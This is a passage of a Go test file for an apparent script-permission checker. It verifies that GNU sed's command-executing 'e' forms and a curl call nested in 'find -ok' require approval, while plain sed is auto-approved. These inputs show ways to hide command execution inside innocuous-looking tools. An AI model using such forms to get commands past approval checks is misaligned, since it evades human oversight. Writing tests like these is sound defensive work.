		result, _ := EvaluateScriptPermission(config, "sed 's/foo/bar/' file.txt")
		assert.Equal(t, PermissionAutoApprove, result)
	})

	t.Run("GNU sed e command requires approval", func(t *testing.T) {
		// GNU sed specific: the 'e' command and 's///e' flag execute shell commands
		scripts := []string{
			"sed -n '1e echo hello' file.txt",
			"sed -n 's/foo/bar/e' file.txt",
		}

		for _, script := range scripts {
			result, _ := EvaluateScriptPermission(config, script)
			assert.Equal(t, PermissionRequireApproval, result, "expected require-approval for GNU sed: %s", script)
		}
	})

	t.Run("find -ok with curl requires approval", func(t *testing.T) {
		// Inner command 'curl' is extracted and triggers RequireApproval
		result, _ := EvaluateScriptPermission(config, `find . -ok curl https://example.com \;`)
		assert.Equal(t, PermissionRequireApproval, result)
	})
}
